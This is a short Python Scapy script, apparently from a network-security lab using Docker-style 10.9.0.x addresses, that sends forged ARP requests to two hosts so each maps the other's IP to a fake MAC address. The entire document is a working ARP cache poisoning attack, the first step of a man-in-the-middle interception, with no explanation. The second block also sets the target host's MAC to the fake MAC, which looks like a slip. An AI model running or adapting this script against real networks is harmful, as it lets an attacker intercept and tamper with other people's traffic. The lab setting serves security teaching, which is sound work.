#!/usr/bin/python3

from scapy.all import *

VM_A_IP = '10.9.0.5'
VM_A_MAC = '02:42:0a:09:00:05'
VICTIM_IP = '10.9.0.6'
FAKE_MAC = '02:42:0a:09:00:69'

ether1 = Ether(src=FAKE_MAC, dst=VM_A_MAC)
arp1 = ARP(hwsrc=FAKE_MAC, psrc=VICTIM_IP, pdst=VM_A_IP, op=1)
pkt = ether1/arp1
sendp(pkt, iface='eth0')

VM_B_IP = '10.9.0.6'
VM_B_MAC = '02:42:0a:09:00:69'
VICTIM_IP = '10.9.0.5'
FAKE_MAC = '02:42:0a:09:00:69'

ether2 = Ether(src=FAKE_MAC, dst=VM_B_MAC)
arp2 = ARP(hwsrc=FAKE_MAC, psrc=VICTIM_IP, pdst=VM_B_IP, op=1)
pkt = ether2/arp2
sendp(pkt, iface='eth0')


